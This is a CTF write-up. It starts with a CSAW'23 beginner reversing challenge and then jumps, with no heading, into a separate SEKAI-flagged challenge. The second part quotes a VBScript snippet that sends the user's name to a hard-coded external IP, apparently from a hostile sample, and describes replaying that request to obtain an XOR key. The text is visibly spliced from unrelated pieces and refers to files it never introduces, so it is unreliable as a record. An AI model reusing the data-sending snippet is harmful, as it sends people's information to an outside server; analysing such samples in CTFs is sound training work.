>I had the privilege of participating in the CSAW'23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the challenges my team and I successfully solved during the competition.

### Rev/Rebug1

```Description:-```
Can't seem to print out the flag :( Can you figure out how to get the flag with this binary?

```Challenge File:``` [file](./CSAW/test.out)

This challenge was beginner level reversing challenge. To see the decompiled code, open the provided binary in IDA and press F5.
![source-code](./CSAW/source-code.png)
According to the coed, the user is expected to input a 12-character string, and if the string length matches, they will receive a flag in response to the input.
Now run the binary and give any 12-character input and you'll get the flag.

Flag:- ```csawctf{c20ad4d76fe97759aa27a0c99bff6710}```






{% highlight ruby %}
 Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 Dim url: url = "http://20.106.250.46/sendUserData"

 With http
  Call .Open("POST", url, False)
  Call .SetRequestHeader("Content-Type", "application/json")
  Call .Send("{""username"":""" & strUser & """}")
 End With

 res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
{% endhighlight %}

From above snippet, it seems that POST request is to be sent to the given URL, after setting request header `Content-Type` to `application/json` and sending json payload

{% highlight ruby %}
 {
   "username":"admin"
 }   
{% endhighlight %}

I set username to `admin` and bravo !! I got the key..

So with the key we XORed the downloaded XORed flag.png and yesss.. we got the flag !!

Flag :- `SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}`
